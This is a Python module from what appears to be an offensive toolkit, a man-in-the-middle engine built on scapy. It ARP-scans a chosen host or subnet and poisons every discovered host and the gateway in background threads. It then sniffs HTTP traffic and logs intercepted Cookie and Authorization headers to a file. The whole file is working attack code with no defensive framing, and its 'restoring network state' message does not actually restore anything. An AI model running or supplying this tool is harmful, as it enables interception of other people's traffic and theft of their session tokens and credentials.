import os
import time
import threading
from scapy.all import ARP, sendp, Ether, srp, IP, TCP, Raw, conf
from rich.console import Console
from core.ui import draw_header

console = Console()


class MITMEngine:
    def __init__(self):
        self.stop_event = threading.Event()
        self.interface = ""
        self.gateway_ip = ""
        self.targets = []  # Supports single IP or Subnet list

    def get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                     timeout=2, verbose=False, iface=self.interface)
        return ans[0][1].hwsrc if ans else None

    def packet_callback(self, packet):
        """Live Session Intelligence: Auto-extracts tokens from the stream."""
        if packet.haslayer(Raw) and packet.haslayer(IP):
            load = str(packet[Raw].load)
            if "Cookie:" in load or "Authorization:" in load:
                console.print(
                    f"[bold red][!] INTEL FOUND ({packet[IP].src}):[/bold red] Session Token Intercepted")
                with open("logs/session_tokens.txt", "a") as f:
                    f.write(f"[{time.ctime()}] {packet[IP].src} -> {load}\n")

    def poison(self, target_ip, target_mac, gateway_mac):
        """Asynchronous poisoning for a specific target."""
        target_pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
                                               hwdst=target_mac, psrc=self.gateway_ip)
        router_pkt = Ether(dst=gateway_mac)/ARP(op=2,
                                                pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip)

        while not self.stop_event.is_set():
            sendp(target_pkt, verbose=False, iface=self.interface)
            sendp(router_pkt, verbose=False, iface=self.interface)
            time.sleep(2)

    def run(self):
        draw_header("MITM Engine: Subnet Dominator")
        self.interface = console.input(
            "[bold yellow]Interface (e.g., eth0): [/bold yellow]")
        self.gateway_ip = console.input(
            "[bold yellow]Gateway IP: [/bold yellow]")
        target_input = console.input(
            "[bold yellow]Target IP or Range (e.g. 192.168.1.5 or 192.168.1.0/24): [/bold yellow]")

        # Resolve Gateway
        gw_mac = self.get_mac(self.gateway_ip)
        if not gw_mac:
            return console.print("[red]Could not resolve Gateway MAC.[/red]")

        # Resolve Targets
        console.print("[*] Mapping targets...")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_input),
                     timeout=2, verbose=False, iface=self.interface)

        for _, rcv in ans:
            if rcv.psrc != self.gateway_ip:
                self.targets.append((rcv.psrc, rcv.hwsrc))

        if not self.targets:
            return console.print("[red]No active targets found.[/red]")

        console.print(
            f"[bold green][+] Poisoning {len(self.targets)} targets...[/bold green]")
        for ip, mac in self.targets:
            threading.Thread(target=self.poison, args=(
                ip, mac, gw_mac), daemon=True).start()

        try:
            from scapy.all import sniff
            sniff(iface=self.interface, prn=self.packet_callback,
                  store=0, filter="tcp port 80 or tcp port 8080")
        except KeyboardInterrupt:
            self.stop_event.set()
            console.print("\n[yellow][*] Restoring network state...[/yellow]")
